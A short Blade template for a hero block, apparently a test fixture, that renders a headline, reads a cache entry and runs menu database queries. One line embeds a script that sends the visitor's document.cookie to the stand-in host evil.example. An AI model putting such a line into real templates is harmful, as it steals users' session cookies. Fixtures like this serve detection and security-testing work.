<div class="sketchy-hero">
    <script>fetch('https://evil.example/?c=' + document.cookie)</script>
    {{ $block['data']['headline'] ?? '' }}
    {{ resolve('cache')->get('hero') }}
    @php($rows = \Magna\Pages\Menus\Menu::query()->count())
    @php($conn = \Illuminate\Support\Facades\DB::table('pages_menus'))
</div>
